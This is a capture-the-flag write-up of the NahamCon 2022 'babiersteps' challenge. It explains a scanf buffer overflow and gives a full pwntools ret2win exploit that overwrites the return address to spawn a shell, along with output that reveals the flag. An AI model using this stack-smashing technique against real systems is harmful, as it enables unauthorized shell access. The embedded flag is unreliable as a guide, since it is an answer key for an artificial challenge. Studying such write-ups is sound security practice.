# NahamCon CTF 2022

## Babiersteps 

> Baby steps! One has to crawl before they can run. 
>
> Author: @M_alpha#3534
>
> [`babiersteps`](babiersteps)

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _ret2win_


## Summary

Basic `scanf` _ret2win_.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE + No canary = easy ROP.


### Ghidra Decompile

```c
undefined8 main(void)
{
  undefined local_78 [112];
  
  puts("Everyone has heard of gets, but have you heard of scanf?");
  __isoc99_scanf(&DAT_00402049,local_78);
  return 0;
}

void win(void)
{
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}
```

`&DAT_00402049` is actually `%s`, IOW, `scanf` is unconstrained enabling a buffer overflow that can smash the stack.  _But what to smash it with?_  Well, the included `win` function.

`local_78` is `0x78` bytes from the base of the stack frame (right above the return address `main` will _return_ to on `return`).  To _return to win_, simply write out `0x78` bytes of garbage followed by the location of `win`.

That's it.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./babiersteps', checksec=False)

if args.REMOTE:
    p = remote('challenge.nahamcon.com', 30823)
else:
    p = process(binary.path)

payload  = b''
payload += 0x78 * b'A'
payload += p64(binary.sym.win)

p.sendlineafter(b'scanf?\n',payload)
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to challenge.nahamcon.com on port 30823: Done
[*] Switching to interactive mode
$ cat flag.txt
flag{4dc0a785da36bfcf0e597917b9144fd6}
```